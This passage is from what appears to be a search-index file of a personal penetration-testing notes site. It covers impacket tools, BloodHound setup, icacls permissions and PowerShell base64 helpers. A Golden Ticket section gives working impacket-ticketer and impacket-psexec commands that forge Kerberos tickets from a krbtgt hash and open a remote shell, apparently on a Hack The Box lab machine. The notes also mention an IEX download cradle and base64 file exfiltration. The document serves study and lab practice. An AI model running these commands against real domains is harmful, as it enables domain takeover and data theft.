Vulnerabilities"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#smbmsrpc","text":"smbclient.py : A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It\u2019s an excellent example to see how to use impacket.smb in action. addcomputer.py : Allows to add a computer to a domain using LDAP or SAMR (SMB). getArch.py: This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature. exchanger.py : A tool for connecting to MS Exchange via RPC over HTTP v2. lookupsid.py : A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups. netview.py : Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers reg.py : Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility. rpcdump.py : This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints. rpcmap.py : Scan for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface. samrdump.py : An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service. services.py : This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change. smbpasswd.py : This script is an alternative to smbpasswd tool and intended to be used for changing expired passwords remotely over SMB (MSRPC-SAMR) MSSQL / TDS mssqlinstance.py : Retrieves the MSSQL instances names from the target host. mssqlclient.py : An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.","title":"SMB/MSRPC"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#file-formats","text":"esentutl.py : An Extensibe Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit) ntfs-read.py : NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents. registry-read.py : A Windwows Registry file format implementation. It allows to parse offline registry hives.","title":"File Formats"},{"location":"Cheatsheets/Windows/2022-07-09-impacket/#other","text":"findDelegation.py : Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment. GetADUsers.py : This script will gather data about the domain\u2019s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. Get-GPPPassword.py : This example extracts and decrypts Group Policy Preferences passwords using streams for treating files instead of mounting shares. Additionally, it can parse GPP XML files offline. mqtt_check.py : Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily. rdp_check.py : [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example tests whether an account is valid on the target host. sniff.py : Simple packet sniffer that uses the pcapy library to listen for packets in # transit over the specified interface. sniffer.py : Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols. ping.py : Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet. ping6.py : Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.","title":"Other"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/","text":"BloodHound BloodHound is a tool for visualising and analyzing Active Directory networks so that you can better identify misconfigurations and paths which would allow you to take full control of the Domain Controller (which is the ultimate goal in any Active Directory engagement) It uses Neo4j to draw interactive graphs which show the links between the objects and Organizational Units within the Domain, it's easier to show than it is to explain: Each one of those nodes and paths can be interacted with for more information. You can mark each node as \"owned\" or \"high value\" depending on what you're looking for. And using some of the prebuilt data queries (the one above is showing \"Shortest Path to Domain Admin\") you can easily see the route you need to take to elevate your privileges and permissions within an AD network. Fun fact: Blood Hound in German is Blut Hund, which appears to be the root of the English version. {: .prompt-info } Neo4j Docker Getting Neo4j installed feels like a chore, so we can just make use of a docker image instead: docker pull neo4j:latest docker run -p 7474:7474 -p 7687:7687 -d --env NEO4J_AUTH=neo4j/test neo4j:latest We only really need those two ports for BloodHound to be able to communicate with so those two commands will do. If you want a more secure password, change the value of NEO4J_AUTH=neo4j/test to something else. Installing BloodHound So I don't actually recommend building this thing, instead I recommend using the Release builds from Github which are kept in line with the master branch of BloodHound. BloodHound Github Release Page Grab the latest one from there, I'm currently using 4.2.0 (#blazeit) but you're likely reading this at some unspecified point in the future, so use whatever is the latest. Running it is straightfowards: # Assuming you've downloaded the release zip already 7z x BloodHound-linux-x64.zip cd BloodHound-linux-x64/ ./BloodHound --no-sandbox Getting Data BloodHound data doesn't grow on trees, we're going to have to use one of the kindly provided \"Collectors\" to do that for us. My preferred choice is the \"SharpHound.ps1\" script as I can load that in remotely using an IEX download cradle but it's dealers choice, both usually work a treat although you're going to want a fairly stable TTY in order to run them. Another good choice is the good old impacket-smbserver.","title":"BloodHound"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/#bloodhound","text":"BloodHound is a tool for visualising and analyzing Active Directory networks so that you can better identify misconfigurations and paths which would allow you to take full control of the Domain Controller (which is the ultimate goal in any Active Directory engagement) It uses Neo4j to draw interactive graphs which show the links between the objects and Organizational Units within the Domain, it's easier to show than it is to explain: Each one of those nodes and paths can be interacted with for more information. You can mark each node as \"owned\" or \"high value\" depending on what you're looking for. And using some of the prebuilt data queries (the one above is showing \"Shortest Path to Domain Admin\") you can easily see the route you need to take to elevate your privileges and permissions within an AD network. Fun fact: Blood Hound in German is Blut Hund, which appears to be the root of the English version. {: .prompt-info }","title":"BloodHound"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/#neo4j-docker","text":"Getting Neo4j installed feels like a chore, so we can just make use of a docker image instead: docker pull neo4j:latest docker run -p 7474:7474 -p 7687:7687 -d --env NEO4J_AUTH=neo4j/test neo4j:latest We only really need those two ports for BloodHound to be able to communicate with so those two commands will do. If you want a more secure password, change the value of NEO4J_AUTH=neo4j/test to something else.","title":"Neo4j Docker"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/#installing-bloodhound","text":"So I don't actually recommend building this thing, instead I recommend using the Release builds from Github which are kept in line with the master branch of BloodHound. BloodHound Github Release Page Grab the latest one from there, I'm currently using 4.2.0 (#blazeit) but you're likely reading this at some unspecified point in the future, so use whatever is the latest. Running it is straightfowards: # Assuming you've downloaded the release zip already 7z x BloodHound-linux-x64.zip cd BloodHound-linux-x64/ ./BloodHound --no-sandbox","title":"Installing BloodHound"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/#getting-data","text":"BloodHound data doesn't grow on trees, we're going to have to use one of the kindly provided \"Collectors\" to do that for us. My preferred choice is the \"SharpHound.ps1\" script as I can load that in remotely using an IEX download cradle but it's dealers choice, both usually work a treat although you're going to want a fairly stable TTY in order to run them. Another good choice is the good old impacket-smbserver.","title":"Getting Data"},{"location":"Cheatsheets/Windows/2022-08-10-golden-ticket/","text":"Golden Tickets need to get hold of the krbtgt hash (this is the key that Windows uses to sign tickets) usually done by performing a DCSync and then performing a secretsdump # to get the `-domain-sid` Get-ADDomain htb.local impacket-ticketer -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local WhateverWeWant The above command will create a file with the ticket information all you need to do to use it is set it as an environment variable: export KRB5CCNAME=WhateverWeWant.ccache Then we can PSExec in as literally any username we like because we just created a ticket with signed by the Domain, and everything within the Domain implicitly trusts anything signed by the Domain and doesn't bother to check, because that's how that works. impacket-psexec -k -debug -no-pass htb.local\\WhateverWeWant@forest Use the machine name/domain name to connect, this particular command doesn't like IP addresses (add to /etc/hosts) {: .prompt-tip } Overcoming any Clock Skew Issues Work out what Timezone the machine is in (roughly) and set that as your localtime in this case setting it to US/Pacific got us to the same caldendar date, which is the important bit of setting the Timezone. sudo su cat /usr/share/zoneinfo/US/Pacific > /etc/localtime exit If you still get a Clock Skew error run date on the target and just set your PC time to whatever time is on the box. Kerberos has issues if there is a difference of 10 minutes or so and some machines end up quite badly out of sync because their local NTP server is crap or you're attacking a VM with no external internet access so it can't update that way. sudo date -s 18:05:49 Rerun the impacket-ticketer command at this point to refresh the ticket. {: .prompt-tip }","title":"Golden Tickets"},{"location":"Cheatsheets/Windows/2022-08-10-golden-ticket/#golden-tickets","text":"need to get hold of the krbtgt hash (this is the key that Windows uses to sign tickets) usually done by performing a DCSync and then performing a secretsdump # to get the `-domain-sid` Get-ADDomain htb.local impacket-ticketer -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local WhateverWeWant The above command will create a file with the ticket information all you need to do to use it is set it as an environment variable: export KRB5CCNAME=WhateverWeWant.ccache Then we can PSExec in as literally any username we like because we just created a ticket with signed by the Domain, and everything within the Domain implicitly trusts anything signed by the Domain and doesn't bother to check, because that's how that works. impacket-psexec -k -debug -no-pass htb.local\\WhateverWeWant@forest Use the machine name/domain name to connect, this particular command doesn't like IP addresses (add to /etc/hosts) {: .prompt-tip }","title":"Golden Tickets"},{"location":"Cheatsheets/Windows/2022-08-10-golden-ticket/#overcoming-any-clock-skew-issues","text":"Work out what Timezone the machine is in (roughly) and set that as your localtime in this case setting it to US/Pacific got us to the same caldendar date, which is the important bit of setting the Timezone. sudo su cat /usr/share/zoneinfo/US/Pacific > /etc/localtime exit If you still get a Clock Skew error run date on the target and just set your PC time to whatever time is on the box. Kerberos has issues if there is a difference of 10 minutes or so and some machines end up quite badly out of sync because their local NTP server is crap or you're attacking a VM with no external internet access so it can't update that way. sudo date -s 18:05:49 Rerun the impacket-ticketer command at this point to refresh the ticket. {: .prompt-tip }","title":"Overcoming any Clock Skew Issues"},{"location":"Cheatsheets/Windows/2023-01-15-101_icalcs/","text":"ICACLs 101 Understanding Windows permissions MSDN Link icacls <FileName> [/grant[:r] <Sid>:<Perm>[...]] [/deny <Sid>:<Perm>[...]] [/remove[:g|:d]] <Sid>[...]] [/t] [/c] [/l] [/q] [/setintegritylevel <Level>:<Policy>[...]] icacls <Directory> [/substitute <SidOld> <SidNew> [...]] [/restore <ACLfile> [/c] [/l] [/q]] Reading the output See below for the full list but the main ones we're really interested in are: F (full access) RX (read and execute access) Full access obviously gives us full control over the file, (Read, Write, Execute, Delete), and RX gives us Read and Execute capabilities. And just after glancing at the others to see if anything else sticks out WDAC actually seems like it could be an important one to keep an eye out for as it seems to be able to control what can and can't run on a system MSDN on WDAC PS C:\\Users\\MrBullsec\\Documents> icacls .\\notes_checklist.md .\\notes_checklist.md NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) CC1\\MrBullsec:(I)(F) SIDs may be in either numerical or friendly name form. If you use a numerical form, affix the wildcard character * to the beginning of the SID. icacls preserves the canonical order of ACE entries as: Explicit denials Explicit grants Inherited denials Inherited grants Perm is a permission mask that can be specified in one of the following forms: A sequence of simple rights: F (full access) M (modify access) RX (read and execute access) R (read-only access) W (write-only access) A comma-separated list in parenthesis of specific rights: D (delete) RC (read control) WDAC (write DAC) WO (write owner) S (synchronize) AS (access system security) MA (maximum allowed) GR (generic read) GW (generic write) GE (generic execute) GA (generic all) RD (read data/list directory) WD (write data/add file) AD (append data/add subdirectory) REA (read extended attributes) WEA (write extended attributes) X (execute/traverse) DC (delete child) RA (read attributes) WA (write attributes) Inheritance rights may precede either Perm form, and they are applied only to directories: (OI): object inherit (CI): container inherit (IO): inherit only (NP): do not propagate inherit","title":"ICACLs 101"},{"location":"Cheatsheets/Windows/2023-01-15-101_icalcs/#icacls-101","text":"Understanding Windows permissions MSDN Link icacls <FileName> [/grant[:r] <Sid>:<Perm>[...]] [/deny <Sid>:<Perm>[...]] [/remove[:g|:d]] <Sid>[...]] [/t] [/c] [/l] [/q] [/setintegritylevel <Level>:<Policy>[...]] icacls <Directory> [/substitute <SidOld> <SidNew> [...]] [/restore <ACLfile> [/c] [/l] [/q]]","title":"ICACLs 101"},{"location":"Cheatsheets/Windows/2023-01-15-101_icalcs/#reading-the-output","text":"See below for the full list but the main ones we're really interested in are: F (full access) RX (read and execute access) Full access obviously gives us full control over the file, (Read, Write, Execute, Delete), and RX gives us Read and Execute capabilities. And just after glancing at the others to see if anything else sticks out WDAC actually seems like it could be an important one to keep an eye out for as it seems to be able to control what can and can't run on a system MSDN on WDAC PS C:\\Users\\MrBullsec\\Documents> icacls .\\notes_checklist.md .\\notes_checklist.md NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) CC1\\MrBullsec:(I)(F) SIDs may be in either numerical or friendly name form. If you use a numerical form, affix the wildcard character * to the beginning of the SID. icacls preserves the canonical order of ACE entries as: Explicit denials Explicit grants Inherited denials Inherited grants Perm is a permission mask that can be specified in one of the following forms: A sequence of simple rights: F (full access) M (modify access) RX (read and execute access) R (read-only access) W (write-only access) A comma-separated list in parenthesis of specific rights: D (delete) RC (read control) WDAC (write DAC) WO (write owner) S (synchronize) AS (access system security) MA (maximum allowed) GR (generic read) GW (generic write) GE (generic execute) GA (generic all) RD (read data/list directory) WD (write data/add file) AD (append data/add subdirectory) REA (read extended attributes) WEA (write extended attributes) X (execute/traverse) DC (delete child) RA (read attributes) WA (write attributes) Inheritance rights may precede either Perm form, and they are applied only to directories: (OI): object inherit (CI): container inherit (IO): inherit only (NP): do not propagate inherit","title":"Reading the output"},{"location":"Recon/mapping/","text":"Application Mapping","title":"Application Mapping"},{"location":"Recon/mapping/#application-mapping","text":"","title":"Application Mapping"},{"location":"Recon/recon/","text":"Recon and Information Gathering Gathering information and performing Recon is one of the most important steps you will take when performing a penetration test. The data and information that you gather at this stage will inform the rest of your testing, so it's worth doing a good initial job so that you don't have to go back and perform additional discovery against the target. DNS Infrastructure Fuzzing","title":"Recon and Information Gathering"},{"location":"Recon/recon/#recon-and-information-gathering","text":"Gathering information and performing Recon is one of the most important steps you will take when performing a penetration test. The data and information that you gather at this stage will inform the rest of your testing, so it's worth doing a good initial job so that you don't have to go back and perform additional discovery against the target.","title":"Recon and Information Gathering"},{"location":"Recon/recon/#dns","text":"","title":"DNS"},{"location":"Recon/recon/#infrastructure","text":"","title":"Infrastructure"},{"location":"Recon/recon/#fuzzing","text":"","title":"Fuzzing"},{"location":"Recon/recon/#_1","text":"","title":""},{"location":"Web/web_hacking/","text":"Web Application Hacking","title":"Web Application Hacking"},{"location":"Web/web_hacking/#web-application-hacking","text":"","title":"Web Application Hacking"},{"location":"Windows/PowerShell/","text":"Useful Functions # Convert a file to Base64 [convert]::ToBase64String((Get-Content -path \"your_file_path\" -Encoding byte)) The above comes in handy for file extraction because you can just copy the Base64 String to another box and decode then pipe to a file # Encode String as Base64 [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Mot\u00f6rhead')) # Decode from Base64 String [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('TW90w7ZyaGVhZA=='))","title":"PowerShell"},{"location":"Windows/PowerShell/#useful-functions","text":"# Convert a file to Base64 [convert]::ToBase64String((Get-Content -path \"your_file_path\" -Encoding byte)) The above comes in handy for file extraction because you can just copy the Base64 String to another box and decode then pipe to a file # Encode String as Base64 [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Mot\u00f6rhead')) # Decode from Base64 String [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('TW90w7ZyaGVhZA=='))","title":"Useful Functions"},{"location":"Windows/windows_101/","text":"Windows 101 $P = Get-Process Write-Output $P","title":"Windows 101"},{"location":"Windows/windows_101/#windows-101","text":"$P = Get-Process Write-Output $P","title":"Windows 101"}]}